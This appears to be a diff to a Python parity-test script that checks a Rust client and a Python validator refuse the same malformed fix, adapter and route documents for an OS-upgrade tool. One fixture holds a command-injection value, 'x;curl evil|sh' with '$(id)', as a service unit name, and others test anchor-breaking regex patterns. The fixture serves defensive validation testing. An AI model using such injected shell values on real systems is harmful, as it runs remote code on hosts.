@@ -97,8 +97,9 @@ def gate_cases():
                 ad, wh = {}, a[0]
             else:
                 ad, wh = a[1], a[2]
+            fx = list(a[0].values()) if kind == "route" else []
             cases.append({"kind": kind, "doc": copy.deepcopy(doc), "adapters": copy.deepcopy(ad), "where": wh,
-                          "refused": bool(errs)})
+                          "fixes": copy.deepcopy(fx), "refused": bool(errs)})
             return errs
         return rec
 
@@ -117,10 +118,148 @@ def gate_cases():
         check.check_fix, check.check_adapter, check.check_route = orig
     # the real atlas too: every fix and adapter must pass in both
     for p, d in fixes.items():
-        cases.append({"kind": "fix", "doc": d, "adapters": adapters, "where": rel(p), "refused": False})
+        cases.append({"kind": "fix", "doc": d, "adapters": adapters, "where": rel(p), "fixes": [], "refused": False})
     for fam, a in adapters.items():
-        cases.append({"kind": "adapter", "doc": a, "adapters": {}, "where": f"adapters/{fam}.toml", "refused": False})
+        cases.append({"kind": "adapter", "doc": a, "adapters": {}, "where": f"adapters/{fam}.toml", "fixes": [],
+                      "refused": False})
+    by_id = {check.content_id(d): d for d in fixes.values()}
+    for p, r in routes.items():
+        cases.append({"kind": "route", "doc": r, "adapters": adapters, "where": rel(p), "fixes": list(by_id.values()),
+                      "refused": False})
     return cases
+
+
+def type_corpus():
+    """Wrong-type and edge-case documents, beyond the gate's own cases. Python refuses many of these by crashing
+    (which fails CI's schema job just the same). The rule here is one-sided: wherever Python refuses, Rust must
+    refuse too. Rust may be stricter; those are listed, not failed."""
+    out = []
+    by_id = {check.content_id(d): d for d in fixes.values()}
+    WH = "fixes/el/centos7/x.toml"
+
+    def base():
+        return {"schema": "wend.fix/0", "family": "el", "hop": "centos7", "when": {"installed": "vsftpd"},
+                "restores": ["box:ftp"], "adds": [],
+                "post": [{"op": "kv.set", "path": "/etc/vsftpd/vsftpd.conf", "values": {"listen": "YES"}}],
+                "meta": {"name": "x"}}
+
+    def fix(label, mut, ad=None):
+        d = base()
+        mut(d)
+        out.append({"label": label, "kind": "fix", "doc": d, "adapters": ad or adapters, "where": WH, "fixes": []})
+
+    def adapter(label, mut):
+        a = copy.deepcopy(adapters["el"])
+        mut(a)
+        out.append({"label": label, "kind": "adapter", "doc": a, "adapters": {}, "where": "adapters/el.toml",
+                    "fixes": []})
+        loose = copy.deepcopy(adapters)
+        loose["el"] = a
+        # and a fix judged by that adapter alone: what check_fix does with it (the client checks both)
+        out.append({"label": label + " (fix under it)", "kind": "fix", "doc": {**base(), "post": [
+            {"op": "service.enable", "unit": "x;curl evil|sh", "like": ["$(id)"]}]}, "adapters": loose,
+            "where": WH, "fixes": []})
+
+    S = lambda **kw: (lambda d: d.update(**kw))  # noqa: E731
+    P = lambda *steps: (lambda d: d.update(post=list(steps)))  # noqa: E731
+    fix("baseline", lambda d: None)
+    fix("pre is a table", S(pre={"op": "repair"}))
+    fix("pre is a string", S(pre="zzz"))
+    fix("restores mixed", S(restores=["bogus", 1]))
+    fix("restores string", S(restores="abc"))
+    fix("restores table", S(restores={"bogus": 1}))
+    fix("adds float", S(adds=[1e-5]))
+    fix("packages string", P({"op": "remove", "packages": "abc", "purge": True}))
+    fix("purge string", P({"op": "remove", "packages": ["abc"], "purge": "no"}))
+    fix("write-file content list", P({"op": "write-file", "path": "/etc/my.cnf", "content": ["x'"]}))
+    fix("write-file content int", P({"op": "write-file", "path": "/etc/my.cnf", "content": 5}))
+    fix("meta not table", S(meta="x"))
+    fix("step not table", S(post=["x"]))
+    fix("kv.set values list", P({"op": "kv.set", "path": "/etc/vsftpd/vsftpd.conf", "values": ["listen"]}))
+    fix("kv.unset keys string", P({"op": "kv.unset", "path": "/etc/my.cnf", "keys": "old_passwords"}))
+    fix("enum int", P({"op": "fs.layout", "layout": 1}))
+    fix("list min", P({"op": "rpm.drop-arch", "arches": []}))
+    fix("transit reinstall str", lambda d: d.update(hop="alma9", post=[
+        {"op": "rpm.transit", "release": "alma8", "remove": "centos-release", "reinstall": "x"}]))
+    fix("install no gate", lambda d: d.update(when={"not": {"installed": "x"}}, post=[
+        {"op": "install", "packages": ["a"]}]))
+    fix("install any gate", lambda d: d.update(when={"any": [{"installed": "a"}, {"all": [
+        {"installed": "a"}, {"file": "/etc/x"}]}]}, post=[{"op": "install", "packages": ["a"]}]))
+    fix("paths glob wider", P({"op": "rpm.adopt-rpmnew", "paths": ["/etc/httpd/conf.d/*"]}))
+    fix("paths subdir", P({"op": "rpm.adopt-rpmnew", "paths": ["/etc/httpd/conf.d/a/b.conf"]}))
+    fix("paths unicode", P({"op": "rpm.adopt-rpmnew", "paths": ["/etc/php.d/é.ini"]}))
+    fix("pattern newline", P({"op": "service.enable", "unit": "a\n", "like": ["b"]}))
+    fix("table key unicode", P({"op": "kv.set", "path": "/etc/vsftpd/vsftpd.conf", "values": {"listen١": "YES"}}))
+    fix("table value int", P({"op": "kv.set", "path": "/etc/vsftpd/vsftpd.conf", "values": {"listen": 1}}))
+    fix("file-contains extra key", S(when={"file-contains": {"path": "/etc/a", "text": "x", "y": "z"}}))
+    fix("mysql-option int", S(when={"mysql-option": {"path": "/etc/a", "key": "x", "value": 1}}))
+    fix("hop list", S(hop=["centos7"]))
+    fix("hop is the first release", S(hop="centos5"))
+    fix("op int", lambda d: d["post"][0].update(op=1))
+    fix("pm-option on rpm", P({"op": "pm-option", "option": "x"}))
+    fix("force string", P({"op": "force-remove", "packages": ["a"], "purge": True, "force": "depends"}))
+    fix("force empty", P({"op": "force-remove", "packages": ["a"], "purge": True, "force": []}))
+    fix("service.record in post", P({"op": "service.record"}))
+    fix("write-file box secrets", P({"op": "write-file", "path": "/etc/wend/x", "content": "a"}))
+    fix("write-file harness file", P({"op": "write-file", "path": "/etc/yum.conf", "content": "a"}))
+    fix("when is a list", S(when=[{"installed": "a"}]))
+    fix("all empty", S(when={"all": []}))
+    fix("not of a list", S(when={"not": [{"installed": "a"}]}))
+    fix("meta name unicode", S(meta={"name": "xı"}))
+    fix("kv.set on a file with sections", P({"op": "kv.set", "path": "/etc/my.cnf", "values": {"old_passwords": "1"}}))
+    adapter("baseline", lambda a: None)
+    adapter("op without args", lambda a: a["ops"]["mysql.upgrade-data"].pop("args"))
+    adapter("op args is a list", lambda a: a["ops"]["service.enable"].update(args=["unit", "like"]))
+    adapter("op spec is a string", lambda a: a["ops"]["service.enable"]["args"].update(unit="x"))
+    adapter("pattern not a string", lambda a: a["ops"]["service.enable"]["args"]["unit"].update(pattern=1))
+    adapter("pattern that breaks out of anchors", lambda a: a["ops"]["service.enable"]["args"]["unit"].update(
+        pattern="[a-z]+)|(?:.*"))
+    adapter("harness_owned string", lambda a: a.update(harness_owned="/etc/x"))
+    adapter("ops a list", lambda a: a.update(ops=["kv.set"]))
+    adapter("pattern lookahead", lambda a: a["ops"]["kv.set"]["args"]["values"].update(table="(?=a)[a-z]+"))
+    adapter("pattern posix class", lambda a: a["ops"]["kv.set"]["args"]["values"].update(table="[[:alpha:]]+"))
+    adapter("pattern %", lambda a: a["ops"]["kv.set"]["args"]["values"].update(table="[a-z%]+"))
+    adapter("pattern newline", lambda a: a["ops"]["kv.set"]["args"]["values"].update(table="[a-z\\n]+"))
+    adapter("may_skip string", lambda a: a.update(may_skip="centos6"))
+    adapter("force string", lambda a: a.update(force="depends"))
+    adapter("kv keys string", lambda a: a["kv"]["/etc/my.cnf"].update(keys="abc"))
+    adapter("path spec not a list name", lambda a: a["ops"]["kv.set"]["args"]["path"].update(path=1))
+    adapter("pm_options a list", lambda a: a.update(pm_options=["x"]))
+    # routes, judged with the real fixes
+    r0 = copy.deepcopy(next(d for d in routes.values() if d["family"] == "el"))
+    for label, mut in [("baseline", lambda r: None),
+                       ("prune_obsolete a string", lambda r: r.update(finish={"prune_obsolete": "yes"})),
+                       ("finish a string", lambda r: r.update(finish="x")),
+                       ("fixes a table", lambda r: r.update(fixes={"id": "x"})),
+                       ("fix ref a string", lambda r: r.update(fixes=["x"])),
+                       ("prune_obsolete true", lambda r: r.update(finish={"prune_obsolete": True})),
+                       ("a fix under another name", lambda r: r["fixes"][0].update(name="other")),
+                       ("a fix outside the route", lambda r: r.update(to="alma9", hops=["centos6", "centos7",
+                                                                                         "alma9"])),
+                       ("an unknown id", lambda r: r["fixes"][0].update(id="sha256:00")),
+                       ("hops out of order", lambda r: r.update(hops=["centos7", "centos6", "alma9", "alma10"])),
+                       ("from after to", lambda r: r.update(**{"from": "alma9"}))]:
+        r = copy.deepcopy(r0)
+        mut(r)
+        out.append({"label": "route " + label, "kind": "route", "doc": r, "adapters": adapters,
+                    "where": "routes/el/x.toml", "fixes": list(by_id.values())})
+    for c in out:
+        try:
+            if c["kind"] == "fix":
+                e = check.check_fix(c["doc"], c["adapters"], c["where"])
+            elif c["kind"] == "adapter":
+                e = check.check_adapter(c["doc"], c["where"])
+            else:
+                e = check.check_route(c["doc"], {check.content_id(f): f for f in c["fixes"]}, c["adapters"],
+                                      c["where"])
+            c["refused"] = bool(e)
+            # what CI's id step does next: canonical JSON (a float or date here is refused by Python too)
+            check.canonical(c["doc"]) if c["kind"] != "adapter" else None
+            if c["kind"] != "adapter" and "Infinity" in json.dumps(c["doc"]):
+                c["refused"] = True
+        except Exception:
+            c["refused"] = True
+    return out
 
 
 def hop_dump(route, hop, only):
@@ -180,11 +319,13 @@ def diff(a, b, path="", out=None):
 
 def main(binary):
     cases = gate_cases()
+    corpus = type_corpus()
     py = python_side(cases)
     with tempfile.NamedTemporaryFile("w", suffix=".json", delete=False) as f:
         json.dump({"steps": [{"family": fam, "release": r, "step": s} for fam, r, s in STEPS],
                    "preds": [{"family": fam, "when": w} for fam, w in PREDS],
-                   "cases": [{k: c[k] for k in ("kind", "doc", "adapters", "where")} for c in cases]}, f)
+                   "cases": [{k: c[k] for k in ("kind", "doc", "adapters", "where", "fixes")}
+                             for c in cases + corpus]}, f)
     try:
         p = subprocess.run([os.path.abspath(binary), "parity", f.name], cwd=ROOT, capture_output=True, text=True)
     finally:
@@ -192,8 +333,15 @@ def main(binary):
     if p.returncode:
         sys.exit(f"the client failed:\n{p.stderr}")
     rs = json.loads(p.stdout)
-    rs["cases"] = [bool(e) for e in rs["cases"]]
+    verdicts = [bool(e) for e in rs["cases"]]
+    rs["cases"], rs_corpus = verdicts[:len(cases)], verdicts[len(cases):]
     errs = diff(py, rs)
+    stricter = []
+    for c, b in zip(corpus, rs_corpus):
+        if c["refused"] and not b:
+            errs.append(f"type corpus, {c['kind']} \"{c['label']}\": python refuses, rust accepts")
+        elif b and not c["refused"]:
+            stricter.append(c["label"])
     for i, (c, a, b) in enumerate(zip(cases, py["cases"], rs["cases"])):
         if a != b:
             errs.append(f"case {i} ({c['kind']} {c['where']}): python {'refuses' if a else 'accepts'}, "
@@ -201,7 +349,11 @@ def main(binary):
     n_hops = sum(len(r["hops"]) for r in routes.values())
     print(f"compared {len(py['ids'])} ids, {len(fixes)} fixes, {n_hops} route hops (x2), {len(STEPS)} op examples, "
           f"{len(PREDS)} predicates, {len(cases)} checker cases "
-          f"({sum(py['cases'])} refused): " + ("identical" if not errs else f"{len(errs)} differences"))
+          f"({sum(py['cases'])} refused), {len(corpus)} type cases ({sum(c['refused'] for c in corpus)} refused): " +
+          ("identical" if not errs else f"{len(errs)} differences"))
+    if stricter:
+        print(f"rust refuses {len(stricter)} type cases python accepts (fine; tighten tools/check.py): " +
+              "; ".join(stricter))
     for e in errs[:40]:
         print("DIFF", e)
     return 1 if errs else 0
